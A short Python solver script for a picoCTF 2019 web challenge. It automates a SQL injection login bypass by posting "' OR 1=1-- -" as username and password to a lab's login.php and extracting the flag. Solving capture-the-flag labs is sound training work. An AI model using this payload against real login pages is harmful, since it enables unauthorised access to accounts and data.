"""Solver for challenge 80 Irish-Name-Repo 1 (picoCTF 2019, Web).

Classic SQLi auth bypass on login.php (SQLite). debug=1 leaks the query,
confirming the injection. Payload comments out the password check and the
query returns the first row (admin) with the flag.

Usage: solve_80_irish_name_repo_1.py <base_url>
"""
import re
import sys
import urllib.parse
import urllib.request


def solve(base: str) -> str:
    base = base.rstrip('/')
    data = urllib.parse.urlencode({
        'username': "' OR 1=1-- -",
        'password': "' OR 1=1-- -",
        'debug': '1',
    }).encode()
    req = urllib.request.Request(base + '/login.php', data=data)
    body = urllib.request.urlopen(req, timeout=20).read().decode(errors='replace')
    m = re.search(r'academy\{[^}]+\}', body)
    assert m, 'flag not found'
    return m.group(0)


if __name__ == '__main__':
    print(solve(sys.argv[1] if len(sys.argv) > 1 else 'http://xebec.cylabacademy.net:48323'))
